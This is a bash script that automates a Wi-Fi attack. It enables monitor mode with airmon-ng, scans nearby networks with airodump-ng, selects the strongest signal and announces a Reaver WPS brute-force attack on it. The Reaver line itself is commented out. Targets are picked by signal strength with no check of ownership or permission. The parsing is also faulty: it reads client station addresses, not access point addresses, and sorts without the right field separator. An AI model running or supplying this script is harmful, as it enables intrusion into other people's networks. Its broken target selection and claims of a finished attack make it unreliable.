#!/bin/bash

# Function to clean up and reset network settings
cleanup() {
    echo "Stopping monitoring mode..."
    sudo airmon-ng stop wlan0mon
    echo "Cleaning up temporary files..."
    rm -f scan_results-01.csv
    echo "Cleanup complete."
}

# Trap to handle script interruption and run cleanup
trap cleanup EXIT

# Check if the necessary tools are installed
if ! command -v airmon-ng &> /dev/null || ! command -v reaver &> /dev/null; then
    echo "Please install aircrack-ng and reaver before running this script."
    exit 1
fi

# Start monitoring mode on wlan0
sudo airmon-ng start wlan0

# Scan for Wi-Fi networks
echo "Scanning for Wi-Fi networks..."
sudo airodump-ng wlan0mon --output-format csv -w scan_results

# Extract the strongest signal network
strongest_network=$(awk -F"," '$1 ~ /Station MAC/ {getline; print $1}' scan_results-01.csv | sort -k9,9nr | head -n 1)

if [ -z "$strongest_network" ]; then
    echo "No networks found."
    cleanup
    exit 1
fi

echo "Strongest network: $strongest_network"

# Attempt to crack the network using Reaver (WPS attack)
echo "Starting Reaver attack on $strongest_network..."
# sudo reaver -i wlan0mon -b $strongest_network -vv

# Cleanup
cleanup
echo "Attack finished. Check the output above for results."
